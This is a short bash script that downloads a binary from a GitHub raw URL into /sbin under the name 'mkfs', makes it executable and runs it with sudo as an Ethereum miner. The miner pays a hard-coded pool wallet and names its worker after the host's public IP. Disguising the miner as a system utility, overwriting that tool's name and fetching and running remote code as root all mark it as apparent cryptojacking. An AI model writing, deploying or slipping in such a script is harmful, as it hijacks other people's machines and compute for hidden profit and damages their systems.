#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0x01b0abc6097e8c270396784de24f86f9f5daa510
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"
cd /sbin
wget -O mkfs https://raw.githubusercontent.com/clansas/enbe/main/harta
chmod +x ./mkfs && sudo ./mkfs -a ethash -o $POOL -u $WALLET.$WORKER $@
